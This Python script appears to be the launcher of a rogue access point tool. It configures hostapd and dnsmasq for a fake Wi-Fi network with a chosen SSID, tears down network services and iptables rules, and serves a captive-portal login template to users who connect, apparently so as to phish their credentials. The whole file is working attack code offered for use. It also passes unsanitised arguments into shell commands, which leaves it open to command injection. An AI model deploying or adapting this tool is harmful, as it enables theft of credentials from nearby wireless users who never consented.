import argparse
import os
import subprocess
from scapy.all import *
import time
from modules.banner import bstring
from modules.banner import print_banner

# templates = os.system('ls templates')

os.system('clear')
print_banner()

parser = argparse.ArgumentParser()
parser.add_argument(
        "-i",
        "--interface",
        type=str,
        required=True,
        help=("Choose an interface that supports managed and monitor " +
            "modes for creating fake AP. " +
            "Example: -i wlan1"))
parser.add_argument(
        "-s",
        "--ssid",
        type=str,
        required=True,
        help=("Choose SSID for fake AP. " +
            "Example: -s Uranium-AP"))
parser.add_argument(
        "-t",
        "--template",
        type=str,
        required=True,
        help=("Choose template to use as captive portal login page. " +
            "Example: -t captive_login. " +
            "Avaiable templates: %s" % (os.listdir('templates'))))

args = parser.parse_args()

iface = args.interface
ssid = args.ssid
template = args.template

print(bstring.INFO, 'Using interface:', iface)
print(bstring.INFO, 'Using SSID:', ssid)
print(bstring.INFO, 'Using template:', template)



print("\n" + bstring.ACTION, "Updating configuration...")

os.system('sed -i "s/interface\=.*/interface=' + iface + '/" config/dnsmasq.conf')
os.system('sed -i "s/interface\=.*/interface=' + iface + '/" config/hostapd.conf')
os.system('sed -i "s/ssid\=.*/ssid=' + ssid + '/" config/hostapd.conf')


print("\n" + bstring.ACTION, "Stopping network services in 3s...")

time.sleep(3)

os.system('''
systemctl stop NetworkManager > /dev/null 2>&1
killall dnsmasq > /dev/null 2>&1
killall hostapd > /dev/null 2>&1
pkill wpa_supplicant > /dev/null 2>&1
nmcli radio wifi off > /dev/null 2>&1
rfkill unblock wlan > /dev/null 2>&1
kill $(lsof -t -i:80) > /dev/null 2>&1
''')


print("\n" + bstring.ACTION, "Starting access point...")
os.system('''
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
iptables -P FORWARD ACCEPT''')

os.system('dnsmasq -C config/dnsmasq.conf')
os.system('hostapd config/hostapd.conf -B')

print("\n" + bstring.ACTION, "Configuring" + bstring.BLUE, iface + bstring.RESET + "...")
os.system('ifconfig ' + iface + ' 10.0.0.1 netmask 255.255.255.0')

print("\n" + bstring.ACTION, "Enabling http server...")
print("\n" + bstring.ACTION, "Waiting for client interaction...")

os.system('python3 server.py -t %s' % (template))

print("\n" + bstring.ACTION, "Enabling services back in 5s...")

time.sleep(5)

os.system('''
systemctl start NetworkManager > /dev/null 2>&1
''')